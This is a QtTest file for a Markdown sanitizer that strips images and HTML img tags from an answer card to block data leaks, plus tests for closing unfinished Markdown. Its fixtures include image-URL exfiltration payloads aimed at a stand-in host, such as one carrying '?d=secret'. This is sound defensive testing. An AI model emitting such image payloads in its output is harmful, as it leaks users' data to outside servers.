import QtQuick
import QtTest
import "../../overlay/markdown.js" as Markdown

// The answer card's Markdown keeps its text and loses every image Qt would load;
// a `![` left anywhere, code included, carries a zero-width space after its `!`.
TestCase {
  name: "Markdown"

  function test_imageless_data() {
    return [
      { tag: "inline image", given: "see ![a chart](https://evil.test/?d=secret) here", expected: "see a chart here" },
      { tag: "image with title", given: "![x](https://evil.test/p.png \"t\")", expected: "x" },
      { tag: "reference image", given: "![x][r]\n\n[r]: https://evil.test/p.png", expected: "x\n\n[r]: https://evil.test/p.png" },
      { tag: "nested brackets", given: "![a [b]](https://evil.test/p.png)", expected: "!\u200b[a [b]](https://evil.test/p.png)" },
      { tag: "escaped bracket in alt", given: "![a\\]](https://evil.test/p.png)", expected: "!\u200b[a\\]](https://evil.test/p.png)" },
      { tag: "angle destination", given: "![x](<https://evil.test/p.png>)", expected: "x" },
      { tag: "collapsed reference", given: "![r][]\n\n[r]: https://evil.test/p.png", expected: "r\n\n[r]: https://evil.test/p.png" },
      { tag: "shortcut reference", given: "![r]\n\n[r]: https://evil.test/p.png", expected: "!\u200b[r]\n\n[r]: https://evil.test/p.png" },
      { tag: "escaped backticks", given: "\\`![x](https://evil.test/p.png)\\`", expected: "\\`!\u200b[x](https://evil.test/p.png)\\`" },
      { tag: "escaped backtick before code", given: "a \\` b ![x](https://evil.test/p.png) c ` d", expected: "a \\` b !\u200b[x](https://evil.test/p.png) c ` d" },
      { tag: "image rebuilt from img alt", given: "!<img alt=\"[x](https://evil.test/p.png)\">", expected: "!\u200b[x](https://evil.test/p.png)" },
      { tag: "image rebuilt from alt", given: "!![[x](https://evil.test/a.png)](https://evil.test/b.png)", expected: "!\u200b[x](https://evil.test/b.png)" },
      { tag: "html img", given: "x <img src=\"https://evil.test/p.png\" alt=\"logo\"> y", expected: "x logo y" },
      { tag: "html img without alt", given: "x <IMG SRC='https://evil.test/p.png'/> y", expected: "x  y" },
      { tag: "html img still streaming", given: "x <img src=\"https://evil.te", expected: "x " },
      { tag: "markup kept", given: "**bold** *it* `code` [link](https://ok.test)\n\n- one\n- two", expected: "**bold** *it* `code` [link](https://ok.test)\n\n- one\n- two" },
      { tag: "code kept", given: "`![x](u)` and\n```\n![y](v)\n```", expected: "`!\u200b[x](u)` and\n```\n!\u200b[y](v)\n```" },
      { tag: "open fence kept", given: "```\n![y](v)", expected: "```\n!\u200b[y](v)" },
    ]
  }

  function test_imageless(data) {
    compare(Markdown.imageless(data.given), data.expected)
  }

  function test_closed_data() {
    return [
      { tag: "open fence", given: "```js\nlet a", expected: "```js\nlet a\n```" },
      { tag: "open bold", given: "a **b", expected: "a **b**" },
      { tag: "empty mark", given: "a **", expected: "a" },
      { tag: "complete", given: "a **b** `c`", expected: "a **b** `c`" },
    ]
  }

  function test_closed(data) {
    compare(Markdown.closed(data.given), data.expected)
  }
}
